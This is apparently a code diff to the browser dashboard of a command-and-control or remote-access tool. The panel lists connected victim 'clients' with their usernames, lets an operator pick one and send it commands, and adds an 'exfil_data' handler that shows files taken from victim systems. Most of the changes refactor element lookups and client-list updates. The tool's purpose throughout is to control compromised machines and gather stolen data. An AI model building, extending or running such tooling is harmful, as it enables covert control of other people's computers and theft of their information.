@@ -644,21 +644,40 @@
 
         // Store client info
         const clientInfoMap = new Map();
+        const clientsList = document.getElementById('clients-list');
+        const clientSelect = document.getElementById('client-select');
+        const clientCount = document.getElementById('client-count');
+        const filesList = document.getElementById('files-list');
+
+        socket.on('client_update', (clients) => {
+            clientsList.innerHTML = '';
+            if (clients.length > 0) {
+                clients.forEach(clientId => {
+                    const clientItem = document.createElement('div');
+                    clientItem.className = 'client-item';
+                    clientItem.setAttribute('data-client-id', clientId);
+                    clientItem.innerHTML = `
+                        <span class="client-ip">${clientId}</span>
+                        <span class="client-status">Online</span>
+                    `;
+                    clientsList.appendChild(clientItem);
+                });
+            } else {
+                clientsList.innerHTML = '<div class="empty-state">No clients connected</div>';
+            }
+            clientCount.textContent = `${clients.length} Clients Connected`;
+            updateClientSelect(clients);
+        });
 
         socket.on('client_info', (data) => {
-            const clientsList = document.getElementById('clients-list');
-            const clientSelect = document.getElementById('client-select');
-            const clientCount = document.getElementById('client-count');
-
             data.forEach(client => {
                 const clientId = client.id;
                 const username = client.system?.username || clientId;
                 clientInfoMap.set(clientId, { username });
 
-                let clientItem = document.querySelector(`.client-item[data-client-id="${clientId}"]`);
+                let clientItem = clientsList.querySelector(`.client-item[data-client-id="${clientId}"]`);
                 if (clientItem) {
-                    const clientIpSpan = clientItem.querySelector('.client-ip');
-                    clientIpSpan.textContent = `${username} (${clientId})`;
+                    clientItem.querySelector('.client-ip').textContent = `${username} (${clientId})`;
                 }
 
                 let option = clientSelect.querySelector(`option[value="${clientId}"]`);
@@ -666,7 +685,6 @@
                     option.textContent = `${username} (${clientId})`;
                 }
             });
-
             clientCount.textContent = `${clientInfoMap.size} Clients Connected`;
         });
 
@@ -686,6 +704,24 @@
             outputDiv.scrollTop = outputDiv.scrollHeight;
         });
 
+        socket.on('exfil_data', (data) => {
+            const parsedData = JSON.parse(data);
+            if (parsedData.type === 'system_info') {
+                const filename = parsedData.filename;
+                if (filename) {
+                    const fileItem = document.createElement('div');
+                    fileItem.className = 'file-item';
+                    fileItem.setAttribute('data-filename', filename);
+                    fileItem.innerHTML = `
+                        <div class="file-icon">F</div>
+                        <div class="file-name">${filename}</div>
+                    `;
+                    filesList.innerHTML = ''; // Clear and add new file
+                    filesList.appendChild(fileItem);
+                }
+            }
+        });
+
         // Update time
         function updateTime() {
             document.getElementById('current-time').textContent = new Date().toLocaleString();
@@ -693,12 +729,26 @@
 
         // Handle client selection
         let selectedClient = null;
+        function updateClientSelect(clients) {
+            clientSelect.innerHTML = '<option value="">Select client</option>';
+            clients.forEach(clientId => {
+                const username = clientInfoMap.get(clientId)?.username || clientId;
+                const option = document.createElement('option');
+                option.value = clientId;
+                option.textContent = `${username} (${clientId})`;
+                clientSelect.appendChild(option);
+            });
+            if (selectedClient && clients.includes(selectedClient)) {
+                clientSelect.value = selectedClient;
+            }
+        }
+
         document.querySelectorAll('.client-item').forEach(item => {
             item.addEventListener('click', () => {
                 document.querySelectorAll('.client-item').forEach(i => i.classList.remove('selected'));
                 item.classList.add('selected');
                 selectedClient = item.getAttribute('data-client-id');
-                document.getElementById('client-select').value = selectedClient;
+                clientSelect.value = selectedClient;
             });
         });
 
@@ -707,7 +757,7 @@
             btn.addEventListener('click', async () => {
                 const command = btn.getAttribute('data-command');
                 if (!selectedClient) {
-                    selectedClient = document.getElementById('client-select').value;
+                    selectedClient = clientSelect.value;
                 }
                 if (!selectedClient) {
                     alert('No client selected');
@@ -733,7 +783,7 @@
                 return;
             }
             if (!selectedClient) {
-                selectedClient = document.getElementById('client-select').value;
+                selectedClient = clientSelect.value;
             }
             if (!selectedClient) {
                 alert('No client selected');
@@ -774,7 +824,7 @@
             if (!command) return;
 
             if (!selectedClient) {
-                selectedClient = document.getElementById('client-select').value;
+                selectedClient = clientSelect.value;
             }
 
             if (!selectedClient) {
